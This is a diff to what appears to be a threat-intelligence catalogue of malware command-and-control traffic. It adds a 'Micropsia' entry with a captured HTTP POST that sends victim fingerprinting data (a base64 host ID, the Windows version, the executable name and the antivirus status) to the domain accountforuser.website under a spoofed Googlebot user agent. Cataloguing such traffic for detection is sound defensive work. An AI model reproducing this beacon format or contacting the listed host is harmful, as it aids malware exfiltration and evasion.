@@ -1420,6 +1420,45 @@ Server: LiteSpeed
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/metamorpho.png "Metamorpho")
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/metamorfo-1.png "Metamorpho")
 
+#### Micropsia
+~~~
+POST /api/white_walkers/new HTTP/1.1
+Connection: KeepAlive
+Content-Type: multipart/form-data; boundary=--------121819110609549
+Content-Length: 818
+Cache-control: no-store
+Host: accountforuser.website
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+
+----------121819110609549
+Content-Disposition: form-data; name="daenerys"
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 8bit
+
+SkVOTklGRVItUENfSmVubmlmZXJfNUZ0MzNidWxETUMybzVG
+----------121819110609549
+Content-Disposition: form-data; name="betriebssystem"
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 8bit
+
+Windows 7 Service Pack 1 (Version 6.1, Build 7601, 64-bit Edition)
+----------121819110609549
+Content-Disposition: form-data; name="anwendung"
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 8bit
+
+ExecuteLibrary.exe v2.0.0
+----------121819110609549
+Content-Disposition: form-data; name="AV"
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 8bit
+
+No Instance(s) Available.
+----------121819110609549--
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/micropsia.png "Micropsia")
+
 #### MilkyBoy
 ~~~
 POST / HTTP/1.1
